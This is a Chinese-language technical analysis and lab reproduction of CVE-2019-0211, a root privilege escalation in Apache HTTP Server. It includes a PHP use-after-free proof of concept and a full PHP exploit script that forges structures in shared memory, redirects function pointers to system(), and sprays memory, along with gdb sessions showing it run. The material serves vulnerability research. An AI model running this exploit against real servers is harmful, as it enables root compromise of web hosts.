---
title: "（CVE-2019-0211）Apache HTTP 服务组件提权漏洞"
id: zhfly2809
---

# （CVE-2019-0211）Apache HTTP 服务组件提权漏洞

## 一、漏洞简介

在Apache HTTP Server 2.4发行版2.4.17到2.4.38中，无论是使用Apache HTTP Server 的MPM event模式、还是worker或prefork模式，在低权限的子进程或线程中执行的代码(包括由进程内脚本解释器执行的脚本)可以通过操纵记分牌（scoreboard）来执行具有父进程(通常是Root进程)权限的任意代码。非unix系统则不受影响。

## 二、漏洞影响

Apache HTTP Server 2.4.17-2.4.38

## 三、复现过程

### 漏洞分析

1.恶意用户首先修改bucket,并使其指向恶意构造的prefork_child_bucket结构（共享内存中）。

2.优雅重启

主服务进程会杀死以前所有的工作进程，然后调用prefork_run，fork出新的工作进程

```
<server/mpm/prefork/prefork.c>

//省略无关的部分

static int prefork_run(apr_pool_t *_pconf, apr_pool_t *plog, server_rec *s)

{

int index;

int remaining_children_to_start;

int i;

```
ap_log_pid(pconf, ap_pid_fname);

if (!retained-&gt;mpm-&gt;was_graceful) {//跳过，因为优雅启动时，was_graceful为true
    if (ap_run_pre_mpm(s-&gt;process-&gt;pool, SB_SHARED) != OK) {
        retained-&gt;mpm-&gt;mpm_state = AP_MPMQ_STOPPING;
        return !OK;
    }
    /* fix the generation number in the global score; we just got a new,
     * cleared scoreboard
     */
    ap_scoreboard_image-&gt;global-&gt;running_generation = retained-&gt;mpm-&gt;my_generation;
} 
``` `…

if (!retained->mpm->was_graceful) {

startup_children(remaining_children_to_start);

remaining_children_to_start = 0;

}

…

while (!retained->mpm->restart_pending && !retained->mpm->shutdown_pending) {

…

ap_wait_or_timeout(&exitwhy, &status, &pid, pconf, ap_server_conf);//获取被杀死的工作进程的PID

…

if (pid.pid != -1) {

processed_status = ap_process_child_status(&pid, exitwhy, status);

child_slot = ap_find_child_by_pid(&pid);//获取PID对应于计分板中对应parent的下标

…

/* non-fatal death… note that it’s gone in the scoreboard. */

if (child_slot >= 0) {

(void) ap_update_child_status_from_indexes(child_slot, 0, SERVER_DEAD,

(request_rec *) NULL);

prefork_note_child_killed(child_slot, 0, 0);

if (processed_status == APEXIT_CHILDSICK) {

/* child detected a resource shortage (E[NM]FILE, ENOBUFS, etc)

* cut the fork rate to the minimum

*/

retained->idle_spawn_rate = 1;

}

else if (remaining_children_to_start

&& child_slot < ap_daemons_limit) {//如果工作进程的死亡不是致命的

/* we’re still doing a 1-for-1 replacement of dead

* children with new children

*/

make_child(ap_server_conf, child_slot,

ap_get_scoreboard_process(child_slot)->bucket);//则将死亡的工作进程的bucket作为参数传递（注意：bucket我们可以用“非常规手段”进行修改，从而提权）

–remaining_children_to_start;

}

}

}

return OK;

}` 
```

make_child：

```
static int make_child(server_rec *s, int slot, int bucket)
{
...
    if (!pid) {
        my_bucket = &all_buckets[bucket];//使my_bucket指向共享内存中的到恶意构造的prefork_child_bucket结构
...
        child_main(slot, bucket);
...    
    return 0;
}
static void child_main(int child_num_arg, int child_bucket)
{
...
    status = SAFE_ACCEPT(apr_proc_mutex_child_init(&my_bucket->mutex,
                                    apr_proc_mutex_lockfile(my_bucket->mutex),
                                    pchild));//如果Apache侦听两个或更多端口，则SAFE_ACCEPT（<code>）将仅执行<code>(这通常是因为服务器侦听HTTP（80）和HTTPS（443）)
...
}
APR_DECLARE(apr_status_t) apr_proc_mutex_child_init(apr_proc_mutex_t **mutex,
                                                    const char *fname,
                                                    apr_pool_t *pool)
{
    return (*mutex)->meth->child_init(mutex, pool, fname);
} 
```

如果apr_proc_mutex_child_init执行，这导致（* mutex） - > meth-> child_init（mutex，pool，fname）被调用，从而执行恶意代码（注意，执行恶意代码的时候，进程仍然处于root权限，后面才降低自身的权限）。

#### 通过gdb恶意修改bucket值造成的崩溃

```
(gdb) 
716            child_main(slot, bucket);
(gdb) s
child_main (child_num_arg=child_num_arg@entry=0, child_bucket=child_bucket@entry=80808080) at prefork.c:380
380    {
(gdb) n
..........
432        status = SAFE_ACCEPT(apr_proc_mutex_child_init(&my_bucket->mutex,
(gdb) s `Program received signal SIGSEGV, Segmentation fault.

0x000000000046c16b in child_main (child_num_arg=child_num_arg@entry=0,

child_bucket=child_bucket@entry=80808080) at prefork.c:432

432        status = SAFE_ACCEPT(apr_proc_mutex_child_init(&my_bucket->mutex,` 
```

#### 利用

利用分4个步骤

*   获得工作进程的R/W访问权限
*   在共享内存中写一个假的prefork_child_bucket结构
*   使all_buckets [bucket]指向该结构
*   等待早上6:25获得任意函数调用

问题：PHP不允许读写/proc/self/mem， 这会阻止我们利用简单方法编辑共享内存

#### 获取工作进程内存的R/W访问权限

##### PHP UAF 0-day

由于mod_prefork经常与mod_php结合使用，因此通过PHP利用漏洞似乎很自然。我们使用PHP 7.x中的0day UAF（这似乎也适用于PHP5.x）来完成利用(也可以利用CVE-2019-6977)

```
<?php

class X extends DateInterval implements JsonSerializable

{

public function jsonSerialize()

{

global $y, $p;

unset($y[0]);

$p = $this->y;

return $this;

}

}

function get_aslr()

{

global $p, $y;

$p = 0;

$y = [new X(‘PT1S’)];

json_encode([1234 => &$y]);

print(“ADDRESS: 0x” . dechex($p) . “\n”);

return $p;

} `get_aslr();` 
```

这是PHP对象上的UAF： 我们unset $y[0]（X的一个实例），但它仍然可以通过$this使用。

##### UAF导致读/写

我们希望实现两件事：

*   读取内存以查找all_buckets的地址
*   编辑共享内存，修改bucket，添加我们自定义的恶意结构

幸运的是，PHP的堆位于内存中的那两个之前。

PHP堆，ap_scoreboard_image，all_buckets的内存地址

```
root@apaubuntu:~# cat /proc/6318/maps | grep libphp | grep rw-p
7f4a8f9f3000-7f4a8fa0a000 rw-p 00471000 08:02 542265 /usr/lib/apache2/modules/libphp7.2.so `(gdb) p *ap_scoreboard_image

$14 = {

global = 0x7f4a9323e008,

parent = 0x7f4a9323e020,

servers = 0x55835eddea78

}

(gdb) p all_buckets

$15 = (prefork_child_bucket *) 0x7f4a9336b3f0` 
```

由于我们在PHP对象上触发UAF，因此该对象的任何属性也将是UAF; 我们可以将这个zend_object UAF转换为zend_string。因为zend_string的结构非常有用：

```
(gdb) ptype zend_string
type = struct _zend_string {
    zend_refcounted_h gc;
    zend_ulong h;
    size_t len;
    char val[1];
} 
```

len属性包含字符串的长度。 通过递增它，我们可以在内存中进一步读写，从而访问我们感兴趣的两个内存区域:共享内存和all_buckets。

##### 定位bucket index 和 all_buckets

我们需要修改ap_scoreboard_image->parent[worker_id]->bucket中的parent结构中的bucket。幸运的是，parent结构总是处于共享内存块的开始，因此很容易找到：

```
➜  /www curl 127.0.0.1
PID: 14380
7f8a19da9000-7f8a19dc1000 rw-s 00000000 00:04 61736                      /dev/zero (deleted)
➜  /www `(gdb) p &ap_scoreboard_image->parent[0]

$1 = (process_score *) 0x7f8a19da9040

(gdb) p &ap_scoreboard_image->parent[1]

$2 = (process_score *) 0x7f8a19da9064

(gdb)` 
```

为了定位到all_buckets,我们可以利用我们对prefork_child_bucket结构的了解:

```
prefork_child_bucket {
    ap_pod_t *pod;
    ap_listen_rec *listeners;
    apr_proc_mutex_t *mutex; <--
}

apr_proc_mutex_t {

apr_pool_t *pool;

const apr_proc_mutex_unix_lock_methods_t *meth; <–

int curr_locked;

char *fname;

```
... 
```

} `apr_proc_mutex_unix_lock_methods_t {

unsigned int flags;

apr_status_t (*create)(apr_proc_mutex_t *, const char *);

apr_status_t (*acquire)(apr_proc_mutex_t *);

apr_status_t (*tryacquire)(apr_proc_mutex_t *);

apr_status_t (*release)(apr_proc_mutex_t *);

apr_status_t (*cleanup)(void *);

apr_status_t (*child_init)(apr_proc_mutex_t **, apr_pool_t *, const char *); <–

apr_status_t (*perms_set)(apr_proc_mutex_t *, apr_fileperms_t, apr_uid_t, apr_gid_t);

apr_lockmech_e mech;

const char *name;

}` 
```

all_buckets[0]->mutex 与 all_buckets[0] 位于同一个内存区域中（我的是第一个heap内存区域中）。apr_proc_mutex_unix_lock_methods_t是一个静态结构，位于libapr的.data，因此meth指针指向libapr中的data段中，且apr_proc_mutex_unix_lock_methods_t结构中的函数，位于libapr中的text段中。

由于我们可以通过/proc/self/maps来了解这些内存区域，我们可以遍历Apache内存中的每一个指针，找到一个匹配该结构的指针，这将是all_buckets [0]。

注意，all_buckets的地址在每次正常重启时都会发生变化。这意味着当我们的漏洞触发时，all_buckets的地址将与我们找到的地址不同。 必须考虑到这一点; 我们稍后会解决该问题。

#### 向共享内存中写入恶意prefork_child_bucket结构

任意函数调用的代码路径如下

```
bucket_id = ap_scoreboard_image->parent[id]->bucket
my_bucket = all_buckets[bucket_id]
mutex = &my_bucket->mutex
apr_proc_mutex_child_init(mutex)
(*mutex)->meth->child_init(mutex, pool, fname) 
```

![image](../img/6a844168810708c8b69f07105b39bcfc.png)

为了利用，我们使(*mutex)->meth->child_init指向zend_object_std_dtor(zend_object* object),这产生以下链:

```
mutex = &my_bucket->mutex
[object = mutex]
zend_object_std_dtor(object)
ht = object->properties
zend_array_destroy(ht)
zend_hash_destroy(ht)
val = &ht->arData[0]->val
ht->pDestructor(val) 
```

pDestructor 使其指向system函数，&ht->arData[0]->val为system函数的字符串。

![image](../img/df7de06f63159fb6783fc63fd2e5235a.png)

如我们所见，两个最左边的两个结构是可以叠加的(prefork_child_bucket,zend_object结构)。

#### 使all_buckets [bucket]指向恶意构造的结构

由于all_buckets地址在每次优雅重启之后会改变，我们需要对其进行改进，有两种改进：喷射共享内存和使用每个process_score结构。

##### 喷射共享内存

如果all_buckets的新地址离旧地址不远，my_bucket将会大概指向我们的结构。因此，我们可以将其全部喷射在共享内存的未使用部分上，而不是将我们的prefork_child_bucket结构放在共享内存的精确位置。但是问题是，该结构也用于作为zend_object结构，因此它的大小为（5 * 8）40个字节以包含zend_object.properties字段。在共享内存中，喷射该混合结构，对我们没有帮助。

为了解决该问题，我们叠加apr_proc_mutex_t和zend_array结构，并将其地址喷洒在共享内存的其余部分。影响将是prefork_child_bucket.mutex和zend_object.properties指向同一地址。 现在，如果all_bucket重新定位没有远离其原始地址，my_bucket将位于喷射区域。

![image](../img/da7ad5719e98147e54ff6afeaea8146e.png)

##### 使用每个process_score结构

每个Apache工作进程都有一个关联的process_score结构，并且每一个都有一个bucket索引。我们可以改变它们中的每一个，而不是改变一个process_score.bucket值，以使它们覆盖内存的另一部分。 例如：

```
ap_scoreboard_image->parent[0]->bucket = -10000 -> 0x7faabbcc00 <= all_buckets <= 0x7faabbdd00
ap_scoreboard_image->parent[1]->bucket = -20000 -> 0x7faabbdd00 <= all_buckets <= 0x7faabbff00
ap_scoreboard_image->parent[2]->bucket = -30000 -> 0x7faabbff00 <= all_buckets <= 0x7faabc0000 
```

这样一来，我们的成功率就是原始成功率乘以Apache Worker的数量。 作者通过在共享内存中查找worker process的PID从而定位到每个process_score结构，并利用被UAF漏洞修改过的字符串结构对bucket字段值进行修改。

#### 成功率

不同的Apache服务具有不同数量的工作进程。 拥有更多的工作进程意味着我们可以在更少的内存上喷射互斥锁的地址，但这也意味着我们可以为all_buckets指定更多的索引。 这意味着拥有更多工作进程可以提高我们的成功率。 在测试Apache服务器上尝试了4个工作进程（默认）后，成功率大约为80％。 随着更多工作进程，成功率跃升至100％左右。

同样，如果漏洞利用失败，它可以在第二天重新启动，因为Apache仍将正常重启。 然而，Apache的error.log将包含有关其工作进程段错误的通知。

#### 利用PHP扩展模块体验任意函数执行

为了更好的理解该漏洞，我们用PHP扩展，来模拟PHP UAF，以达到任意地址读写。

#### 环境

操作系统:CentOS 7 x64

Apache版本:Apache/2.4.38 (Unix)

PHP版本:PHP 7.3.3

Apache 编译选项:

```
./configure --prefix=/usr/local/httpd/ \
--sysconfdir=/etc/httpd/ \
--with-include-apr \
--disable-userdir \
--enable-headers \
--with-mpm=prefork \
--enable-modules=most \
--enable-so \
--enable-deflate \
--enable-defate=shared \
--enable-expires-shared \
--enable-rewrite=shared \
--enable-static-support \
--with-apr=/usr/local/apr/ \
--with-apr-util=/usr/local/apr-util/bin \
--with-ssl \
--with-z 
```

PHP编译选项:

```
./configure --prefix=/usr/local/php/ \
--with-config-file-path=/usr/local/php/etc/ \
--with-apxs2=/usr/local/httpd/bin/apxs \             
--enable-fpm \
--with-zlib \
--with-libxml-dir \
--enable-sockets \
--with-curl \
--with-jpeg-dir \
--with-png-dir \
--with-gd \
--with-iconv-dir \
--with-freetype-dir \
--enable-gd-native-ttf \
--with-xmlrpc \
--with-openssl \
--with-mhash \
--with-mcrypt \
--with-pear \
--enable-mbstring \
--enable-sysvshm \
--enable-zip \
--disable-fileinfo 
```

PHP扩展

```
[root@bogon php-extension]# cat read_mem.c 
#include <stdio.h>
#include <stdint.h>

long read_mem(long addr)

{

return (unsigned long)(*((uint8_t*)(addr)));

}

[root@bogon php-extension]# cat write_mem.c

#include <stdio.h>

#include <stdint.h> `void write_mem(long addr,long data)

{

*((uint8_t*)addr) = data;

}

[root@bogon php-extension]#` 
```

#### 问题

我在Apache 2.4.38 与 Apache 2.4.25中，测试发现all_buckets的地址与共享内存的地址之间的差值，远远不是一个4字节能表示的（bucket索引4字节）。所以在我的演示中，需要通过gdb来修改

```
my_bucket = &all_buckets[bucket];//prefork.c:685 
```

my_bucket的值，来模拟修改bucket，使其指向恶意的prefork_child_bucket结构。

#### PHP利用代码

```
<?php

function read_mem_dword($addr)

{

$ret = 0;

for($j = 0;$j<4;$j++){

$ret += read_mem($addr+$j) * pow(256,$j);

}

return $ret;

}

function read_mem_qword($addr)

{

$ret = 0;

for($j = 0;$j<8;$j++){

$ret += read_mem($addr+$j) * pow(256,$j);

}

return $ret;

}

function read_mem_byte($addr)

{

return read_mem($addr);

}

function write_mem_qword($addr,$data)

{

for($j=0;$j<8;$j++){

$b = (0xff&(($data)>>($j*8)));

write_mem($addr+$j,$b);

}

}

function write_mem_dword($addr,$data)

{

for($j=0;$j<4;$j++){

$b = (0xff&(($data)>>($j*8)));

write_mem($addr+$j,$b);

}

}

function write_mem_byte($addr,$data)

{

write_mem($addr,$data);

}

/*

get_mem_region:

str为，maps文件中的特征字符串,用于搜索指定的内存区域

返回值为:

array(2) {

[0]=>//第一个匹配的内存区域

array(2) {

[0]=>

int(140231115968512)//起始地址

[1]=>

int(140231116066816)//结束地址

[2]=>

string(4) “rw-s”//保护权限

}

[1]=>//第二个匹配的内存区域

array(2) {

[0]=>

int(140231116201984)

[1]=>

int(140231116718080)

[2]=>

string(4) “rw-s”//保护权限

}

}

*/

function get_mem_region($str)

{

$file = fopen("/proc/self/maps",“r”);

$result_index = 0;

$result = array();

while(!feof($file)){

$line = fgets($file);

if(strpos($line,$str)){

$addr_len = 0;

for(;$line[$addr_len]!=’-’;$addr_len++);

```
 $start_addr_str =  substr($line,0,$addr_len);
        $end_addr_str = substr($line,$addr_len+1,$addr_len);

        $result[$result_index][0] = hexdec($start_addr_str);
        $result[$result_index][1] = hexdec($end_addr_str);
        $result[$result_index][2] = substr($line,$addr_len*2+2,4);
        $result_index++;
    }
}
fclose($file);

return $result; 
```

}

function locate_parent_arr_addr()//获取共享内存中，parent数组的首地址

{

$my_pid = getmypid();

$shm_region = get_mem_region("/dev/zero");

if(!count($shm_region))

return 0;

```
//parent数组项的大小是，每个0x20个字节
//pid_t在我环境中，大小4字节
$pid_t_size = 4;
$parent_size = 0x24;

//只检查共享内存的前0x1000字节(4KB)
for($i = 0;$i&lt;0x1000;$i++){
    $hit_count = 0;
    for($j = 0;$j&lt;5;$j++){//循环次数，请参考httpd-mpm.conf中的prefork的MinSpareServers
        $pid = read_mem_dword($shm_region[0][0]+ $i + $j*$parent_size);
        if( $my_pid - 20 &lt; $pid &amp;&amp; $pid &lt; $my_pid+20){//因为prefork中，进程的pid是紧挨的，我们可以通过这个来判断是否是parent数组的首地址
            $hit_count++;    
        }
    }
    if($hit_count == 5){
        return $shm_region[0][0]+$i;
    }
}

return 0; 
```

}

function locate_self_parent_struct_addr()//获取共享内存中，当前parent的首地址

{

$my_pid = getmypid();

$shm_region = get_mem_region("/dev/zero");

if(!count($shm_region))

return 0;

//因为parent数组，总是位于第一个/dev/zero中，所以，我们只搜索第一个

echo “/dev/zero start addr:0x”.dechex($shm_region[0][0])."\n";

echo “/dev/zero end addr:0x”.dechex($shm_region[0][1])."\n";

```
for($i =0;$i&lt;4096;$i++){
    $pid = read_mem_dword($shm_region[0][0]+$i);//pid_t在我的环境中，为4字节大小
    if($pid == $my_pid){
        return $shm_region[0][0]+$i;//找到直接返回
    }
}

return 0; 
```

}

//获取all_buckets的地址

function locate_all_buckets_addr()

{

$heap_region = get_mem_region(“heap”);//在我的环境中，all_bucket位于第一个heap中

$libapr_region = get_mem_region(“libapr-”);

if(!count($heap_region) || !count($libapr_region))

return 0;

$heap_start_addr = $heap_region[0][0];

$heap_end_addr = $heap_region[0][1];

```
echo "heap start addr:0x".dechex($heap_start_addr)."\n";
echo "heap end addr:0x".dechex($heap_end_addr)."\n";

$libapr_text_start_addr = 0;
$libapr_data_start_addr = 0;
$libapr_text_end_addr = 0;
$libapr_data_end_addr = 0;
for($i = 0;$i&lt;count($libapr_region);$i++){
    if($libapr_region[$i][2] === "r-xp"){//代码段
        $libapr_text_start_addr = $libapr_region[$i][0];
        $libapr_text_end_addr = $libapr_region[$i][1];
        continue;
    }

    if($libapr_region[$i][2] === "r--p"){//const data
        $libapr_data_start_addr = $libapr_region[$i][0];
        $libapr_data_end_addr = $libapr_region[$i][1];
        continue;
    }
}

echo "libapr text start addr:0x".dechex($libapr_text_start_addr)."\n";
echo "libapr text end addr:0x".dechex($libapr_text_end_addr)."\n";

echo "libapr data start addr:0x".dechex($libapr_data_start_addr)."\n";
echo "libapr data end addr:0x".dechex($libapr_data_end_addr)."\n";

$result = array();
$result_index = 0;
for($i = 0;$i&lt;$heap_end_addr - $heap_start_addr;$i+=8){//遍历heap
    $mutex_addr = read_mem_qword($heap_start_addr + $i);//prefork_child_bucket中的mutex
    if( $heap_start_addr &lt;$mutex_addr &amp;&amp; $mutex_addr&lt;$heap_end_addr ){

        $meth_addr = read_mem_qword($mutex_addr + 8);//apr_proc_mutex_t中的meth

        if( $libapr_data_start_addr &lt; $meth_addr &amp;&amp; $meth_addr &lt; $libapr_data_end_addr){

            $function_point = read_mem_qword($meth_addr+8);
            if($libapr_text_start_addr &lt; $function_point &amp;&amp; $function_point &lt; $libapr_text_end_addr){
                $result[$result_index++] = $heap_start_addr + $i - 8 -8;
            }
        }
    }
}

//在我的环境中，有多个地址满足是all_buckets 地址的要求，但是只有第3个才是正确的
if( count($result)!= 4 ){
    return 0;
}
else{
    return $result[2];
} 
```

}

echo “PID: “.getmypid().”\n”;

$parent_struct_addr = locate_self_parent_struct_addr();

if($parent_struct_addr == 0){

die(“get self parent struct addr error\n”);

}

echo “self parent struct addr:0x”.dechex($parent_struct_addr)."\n";

$parent_arr_addr = locate_parent_arr_addr();

if($parent_arr_addr){

echo “parent arr addr:0x”.dechex($parent_arr_addr)."\n";

}

$all_buckets_addr = locate_all_buckets_addr();

if($all_buckets_addr == 0){

die(“get all_buckets addr error\n”);

}

echo “all_buckets addr:0x”.dechex($all_buckets_addr)."\n";

$evil_parent_start_addr = $parent_arr_addr + 0x24 * 10;//(我这里的parent 就是 prefork_child_bucket结构，0x24是每个prefork_child_bucket的大小，10参考http-mpm.conf中prefork的MaxSpareServers)

echo “evil prefork_child_bucket start addr:0x”.dechex($evil_parent_start_addr)."\n";

//我们需要将prefork_child_bucket与zend_object结合，使其包含zend_object 的 properties字段,因此prefork_child_bucket的"大小"是40+16字节

$evil_parent_end_addr = $evil_parent_start_addr + 40+16;

echo “evil prefork_child_bucket end addr:0x”.dechex($evil_parent_end_addr)."\n";

//将apr_proc_mutex_t结构与zend_array结构结合为一个结构

$evil_zend_array_start_addr = $evil_parent_end_addr;

echo “evil zend_array start addr:0x”.dechex($evil_zend_array_start_addr)."\n";

$evil_zend_array_end_addr = $evil_zend_array_start_addr + 0x38;

echo “evil zend_array end addr:0x”.dechex($evil_zend_array_end_addr)."\n";

//apr_proc_mutex_unix_lock_methods_t结构

$evil_mutex_methods_start_addr = $evil_zend_array_end_addr;

$evil_mutex_methods_end_addr = $evil_mutex_methods_start_addr + 0x50;

echo “evil mutex_methods start addr:0x”.dechex($evil_mutex_methods_start_addr)."\n";

echo “evil mutex_methods end addr:0x”.dechex($evil_mutex_methods_end_addr)."\n";

//system()中的字符串

$evil_string = “touch /hello”;

$evil_string_len = strlen($evil_string)+1;//\0结尾

if($evil_string_len%8){//对齐

$evil_string_len = ((int)($evil_string_len/8)+1)*8;

}

echo “evil string: “.$evil_string.” len:”.$evil_string_len."\n";

$evil_string_start_addr = $evil_mutex_methods_end_addr;

$evil_string_end_addr = $evil_string_start_addr + $evil_string_len;

echo “evil string start addr:0x”.dechex($evil_string_start_addr)."\n";

echo “evil string end addr:0x”.dechex($evil_string_end_addr)."\n";

//查找zend_object_std_dtor的地址(我的在libphp7.so)

$zend_object_std_dtor_addr = 0;

$libphp_region = get_mem_region(“libphp”);

if(!count($libphp_region)){

die(“can’t find zend_object_std_dtor function addr\n”);

}

for($i = 0;$i<count($libphp_region);$i++){

if($libphp_region[$i][2] === “r-xp”){

$zend_object_std_dtor_addr = $libphp_region[$i][0]+0x4F8300;//zend_object_std_dtor 在libphp7.so代码段中的偏移

break;

}

}

if($zend_object_std_dtor_addr === 0){

die(“can’t find zend_object_std_dtor function addr\n”);

}

echo “zend_object_std_dtor function addr:0x”.dechex($zend_object_std_dtor_addr)."\n";

//查找system函数的地址(在libpthread中)

$system_addr = 0;

$pthread_region = get_mem_region(“pthread”);

if(!count($pthread_region)){

die(“can’t find system function addr\n”);

}

for($i = 0;$i<count($pthread_region);$i++){

if($pthread_region[$i][2] === “r-xp”){

$system_addr = $pthread_region[$i][0]+0xF4C0;//system 在libpthread-2.17.so代码段中的偏移

break;

}

}

if($system_addr === 0){

die(“can’t find system function addr\n”);

}

echo “system function addr:0x”.dechex($system_addr)."\n";

//将apr_proc_mutex_unix_lock_methods_t中的child_init改为zend_object_std_dtor

$child_init = $evil_mutex_methods_start_addr+0x30;

echo “child_init(0x”.dechex($child_init).") => zend_object_std_dtor\n";

write_mem_qword($evil_mutex_methods_start_addr+0x30,$zend_object_std_dtor_addr);

//将混合结构zend_array的pDestructor指向system

$pDestructor = $evil_zend_array_start_addr + 0x30;

echo “pDestructor(0x”.dechex($pDestructor).") => system\n";

write_mem_qword($pDestructor,$system_addr);

//将混合结构zend_array的meth指向apr_proc_mutex_unix_lock_methods_t

$meth = $evil_zend_array_start_addr + 0x8;

echo “meth(0x”.dechex($meth).") => mutex_mthods_struct\n";

write_mem_qword($meth,$evil_mutex_methods_start_addr);

write_mem_qword($evil_zend_array_start_addr,0x1);

//将prefork_child_bucket中的mutex指向混合结构zend_array

$mutex = $evil_parent_start_addr + 0x10;

echo “mutex(0x”.dechex($mutex).") => zend_array struct\n";

write_mem_qword($mutex,$evil_zend_array_start_addr);

//将混合结构prefork_child_bucket中的properties指向zend_array结构

$properties = $evil_parent_start_addr + 0x20+0x10;

echo “properties(0x”.dechex($properties).") => zend_array struct\n";

write_mem_qword($properties,$evil_zend_array_start_addr);

//system 字符串 写入

for($i = 0;$i<strlen($evil_string);$i++){

$b = ord($evil_string[$i]);

write_mem($evil_string_start_addr+$i,$b);

}

write_mem($evil_string_start_addr+$i,0);

//将zend_array中的arData指向system字符串

$ar_data = $evil_zend_array_start_addr + 0x10;

echo “ar_data(0x”.dechex($ar_data).") => evil string\n";

write_mem_qword($ar_data,$evil_string_start_addr);

//将zend_array中的nNumUsed设置为1，（自行分析代码去）

$nNumUsed = $evil_zend_array_start_addr + 0x18;

write_mem_qword($nNumUsed,1);

//堆喷

echo “\nSpraying the shared memory start\n\n”;

$shm_region = get_mem_region("/dev/zero");

$evil_shm_start_addr = $evil_string_end_addr;

$evil_shm_end_addr = $shm_region[0][1];

$evil_shm_size = $evil_shm_end_addr - $evil_shm_start_addr;

$evil_shm_mid_addr = $evil_shm_start_addr + 8*((int)(((int)($evil_shm_size/2))/8) + 1);

echo “evil_shm_start:0x”.dechex($evil_shm_start_addr)."\n";

echo “evil_shm_end:0x”.dechex($evil_shm_end_addr)."\n";

echo “evil_shm_size:”.dechex($evil_shm_size)."\n";

for($i = 0;$i<$evil_shm_size;$i+=8){

write_mem_qword($evil_shm_start_addr+$i,$evil_zend_array_start_addr);

}

echo “evil_shm_mid_addr:0x”.dechex($evil_shm_mid_addr)."\n"; `echo “bucket:”.dechex($bucket)."\n";

?>` 
```

利用成功时，会在根目录下，创建hello文件

#### 步骤

##### 根目录显示

```
➜  ~ ls /
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  www 
```

##### 让服务器执行恶意php代码

```
➜  ~ curl 127.0.0.1
PID: 19896
/dev/zero start addr:0x7f1f62a32000
/dev/zero end addr:0x7f1f62a4a000
self parent struct addr:0x7f1f62a32040
parent arr addr:0x7f1f62a32040
heap start addr:0xf59000
heap end addr:0x1022000
libapr text start addr:0x7f1f61ffa000
libapr text end addr:0x7f1f6202f000
libapr data start addr:0x7f1f6222e000
libapr data end addr:0x7f1f6222f000
all_buckets addr:0xff0c18
evil prefork_child_bucket start addr:0x7f1f62a321a8
evil prefork_child_bucket end addr:0x7f1f62a321e0
evil zend_array start addr:0x7f1f62a321e0
evil zend_array end addr:0x7f1f62a32218
evil mutex_methods start addr:0x7f1f62a32218
evil mutex_methods end addr:0x7f1f62a32268
evil string: touch /hello len:16
evil string start addr:0x7f1f62a32268
evil string end addr:0x7f1f62a32278
zend_object_std_dtor function addr:0x7f1f5c03d300
system function addr:0x7f1f617a94c0
child_init(0x7f1f62a32248) => zend_object_std_dtor
pDestructor(0x7f1f62a32210) => system
meth(0x7f1f62a321e8) => mutex_mthods_struct
mutex(0x7f1f62a321b8) => zend_array struct
properties(0x7f1f62a321d8) => zend_array struct
ar_data(0x7f1f62a321f0) => evil string

Spraying the shared memory start `evil_shm_start:0x7f1f62a32278

evil_shm_end:0x7f1f62a4a000

evil_shm_size:17d88

evil_shm_mid_addr:0x7f1f62a3e140

bucket:fe3ec349aa5` 
```

此时，共享内存中，已经被我们的恶意数据给填充。

##### 为通过gdb模拟修改bucket指向我们的恶意结构做准备

```
[root@bogon john]# ps -aux | grep httpd
root      19895  0.0  0.2 285296 10652 ?        Ss   14:27   0:00 /usr/local/httpd//bin/httpd -k start
www       19896  0.0  0.2 287512  9348 ?        S    14:27   0:00 /usr/local/httpd//bin/httpd -k start
www       19897  0.0  0.1 287512  7616 ?        S    14:27   0:00 /usr/local/httpd//bin/httpd -k start
www       19898  0.0  0.1 287512  7616 ?        S    14:27   0:00 /usr/local/httpd//bin/httpd -k start
www       19899  0.0  0.1 287512  7616 ?        S    14:27   0:00 /usr/local/httpd//bin/httpd -k start
www       19900  0.0  0.1 287512  7616 ?        S    14:27   0:00 /usr/local/httpd//bin/httpd -k start
root      20112  0.0  0.0 112708   980 pts/2    R+   14:30   0:00 grep --color=auto httpd
[root@bogon john]# gdb attach 19895
(gdb) break child_main
Breakpoint 1 at 0x46c000: file prefork.c, line 380.
(gdb) set follow-fork-mode child
(gdb) c 
```

##### 执行apachectl graceful，使其优雅重启

```
[root@bogon john]# apachectl graceful
[root@bogon john]# 
```

##### 修改my_bucket

我们将my_bucket，设置为0x7f1f62a3e140，该地址是执行恶意PHP代码时，输出的evil_shm_mid_addr

```
Continuing.

Program received signal SIGUSR1, User defined signal 1.

0x00007f1f612bdf53 in __select_nocancel () from /lib64/libc.so.6

(gdb) c

Continuing.

[New process 20155]

[Thread debugging using libthread_db enabled]

Using host libthread_db library “/lib64/libthread_db.so.1”.

[Switching to Thread 0x7f1f62ae9780 (LWP 20155)] `Breakpoint 1, child_main (child_num_arg=child_num_arg@entry=0, child_bucket=child_bucket@entry=0) at prefork.c:380

380    {

(gdb) set my_bucket = 0x7f1f62a3e140

(gdb) c

Continuing.

[New process 20177]

[Thread debugging using libthread_db enabled]

Using host libthread_db library “/lib64/libthread_db.so.1”.

process 20177 is executing new program: /usr/bin/bash

Error in re-setting breakpoint 1: Function “child_main” not defined.

process 20177 is executing new program: /usr/bin/touch

Missing separate debuginfos, use: debuginfo-install bash-4.2.46-31.el7.x86_64

[Inferior 3 (process 20177) exited normally]

Missing separate debuginfos, use: debuginfo-install coreutils-8.22-23.el7.x86_64

(gdb)` 
```

##### 查看根目录，发现利用成功

```
➜  ~ ls /
bin  boot  dev  etc  hello  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  www 
```

#### EXP分析

1.在作者提供的Exp中，没有依赖具体的硬编码数值。在get_all_address函数中利用 /proc/self/maps和文件读取的方式定位到了如下shm, system, libaprR, libaprX, apache, zend_object_std_dtor几个函数的地址以及共享内存起始地址。

2.在get_workers_pids中通过枚举/proc/*/cmdline and /proc/*/status文件，得到所有worker进程的PID，用于后续在共享内存中定位process_score地址。

3.最终在real函数中，作者通过在共享内存中查找worker process的PID从而定位到每个process_score结构，并利用被UAF漏洞修改过的字符串对内存进行修改。利用内存模式匹配找到all_buckets的起始位置，并复用了 在scoreboard中空闲的servers结构保存生成的payload。最后利用在2步中获取的worker进程id找到所有的process_score，将其中的bucket修改成指定可利用的值。

### 补充

关于需要开始ssl模块说明：

1.  就算不开ssl模块，漏洞也是存在的
2.  就算不开启ssl模块，你自己修改apache配置，能开启其他端口，也是能利用的
3.  如果只开了80端口，则需要另行找一条利用链，github上公布exp在只开启了一个端口的情况下是无效的
